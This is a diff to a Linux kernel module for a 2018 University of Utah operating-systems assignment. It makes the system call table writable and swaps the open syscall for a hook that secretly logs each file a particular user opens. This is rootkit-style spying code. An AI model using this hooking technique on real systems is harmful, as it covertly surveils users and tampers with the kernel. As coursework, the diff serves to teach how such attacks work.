@@ -13,6 +13,13 @@
  * by the Free Software Foundation.
  ======================================================================== */
 
+/*
+ * Modified by Christopher Allan
+ * Class: CS 5460
+ * Semester: Spring 2018
+ * School: University of Utah
+ */
+
 #include <linux/version.h>
 #include <linux/module.h>
 #include <linux/moduleparam.h>
@@ -40,8 +47,6 @@ MODULE_LICENSE("GPL");
 
 #define SHADY_DEVICE_NAME "shady"
 
-asmlinkage int (*old_open)(const char*, int, int);
-
 /* parameters */
 static int shady_ndevices = SHADY_NDEVICES;
 
@@ -51,11 +56,14 @@ module_param(shady_ndevices, int, S_IRUGO);
 static unsigned int shady_major = 0;
 static struct shady_dev *shady_devices = NULL;
 static struct class *shady_class = NULL;
-/*** ADDED by Christopher Allan***/
+/*** ADDED by Chris Allan***/
+asmlinkage int (*old_open)(const char*, int, int); // old open delegate
 static unsigned long syscall_table = 0xffffffff81801400;  // sys_call_table
-static uid_t marksUID = 1000; // mark's User ID
+static uid_t marksUID = 1001; // mark's User ID
+/*** END ***/
 /* ================================================================ */
 
+/*** ADDED by Chris Allan : Code given in assignment ***/
 void
 set_addr_rw (unsigned long addr) 
 {
@@ -63,6 +71,18 @@ set_addr_rw (unsigned long addr)
   pte_t *pte = lookup_address(addr, & level);
   if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
 }
+
+asmlinkage int my_open(const char* file, int flags, int mode)
+{
+  kuid_t whoDis = current_uid();
+  if(whoDis.val == marksUID)
+    {
+      printk("Mark is about to open '%s'\n", file);
+    }
+
+  return old_open(file, flags, mode);
+}
+/*** END ***/
 
 int 
 shady_open(struct inode *inode, struct file *filp)
@@ -183,6 +203,14 @@ shady_construct_device(struct shady_dev *dev, int minor,
     cdev_del(&dev->cdev);
     return err;
   }
+
+  /*** ADDED by Chris Allan ***/
+  // store old open to be restored later
+  old_open = ((void **)syscall_table)[__NR_open];
+  // save over open reference with my_open.  Muwahahaha.
+  ((void **)syscall_table)[__NR_open] = &my_open;
+  /*** END ***/
+
   return 0;
 }
 
@@ -221,17 +249,6 @@ shady_cleanup_module(int devices_to_destroy)
   return;
 }
 
-asmlinkage int my_open(const char* file, int flags, int mode)
-{
-  kuid_t whoDis = current_uid();
-  if(whoDis.val == marksUID)
-    {
-      printk("Mark is about to open '%s'\n", file);
-    }
-
-  return old_open(file, flags, mode);
-}
-
 static int __init
 shady_init_module(void)
 {
@@ -240,13 +257,11 @@ shady_init_module(void)
   int devices_to_destroy = 0;
   dev_t dev = 0;
 
-  // set syscall table to read/write
+  /*** ADDED by Chris Allan ***/
+  // set syscall table to read-write
   set_addr_rw(syscall_table);
-  // store old open to be restored later
-  old_open = ((void **)syscall_table)[__NR_open];
-  // save over open reference with my_open.  Muwahahaha.
-  ((void **)syscall_table)[__NR_open] = &my_open;
-	
+  /*** END ***/
+
   if (shady_ndevices <= 0)
     {
       printk(KERN_WARNING "[target] Invalid value of shady_ndevices: %d\n", 
@@ -271,9 +286,7 @@ shady_init_module(void)
   }
 	
   /* Allocate the array of devices */
-  shady_devices = (struct shady_dev *)kzalloc(
-						shady_ndevices * sizeof(struct shady_dev), 
-						GFP_KERNEL);
+  shady_devices = (struct shady_dev *)kzalloc(shady_ndevices * sizeof(struct shady_dev), GFP_KERNEL);
   if (shady_devices == NULL) {
     err = -ENOMEM;
     goto fail;
